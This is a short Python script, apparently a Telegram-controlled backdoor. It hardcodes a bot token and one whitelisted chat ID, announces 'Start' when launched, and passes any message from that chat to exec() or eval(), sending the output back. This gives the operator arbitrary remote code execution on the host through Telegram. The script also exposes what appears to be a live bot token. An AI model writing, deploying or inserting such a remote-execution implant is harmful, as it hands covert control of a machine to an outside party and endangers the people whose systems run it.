import telebot;token='6421982853:AAGpLTpCiV4byFyGHDoelPj-PwQyGca6TvA';bot = telebot.TeleBot(token);wl = [1346243726];bot.send_message(wl[0], 'Start')
@bot.message_handler()
def f(m):
    try:
        if('exec:' in m.text and m.chat.id in wl):exec(''.join(m.text.split('exec:')[1:]));bot.send_message(m.chat.id, 'S')
        elif m.chat.id in wl:r=eval(m.text);bot.send_message(m.chat.id, '\n'.join([str(x) for x in r]) if (str(type(r))=="<class 'list'>" or str(type(r))=="<class 'dict'>") else (r if r!=None else 'S'))
    except Exception as e:bot.send_message(m.chat.id, e)
bot.polling(none_stop=True)
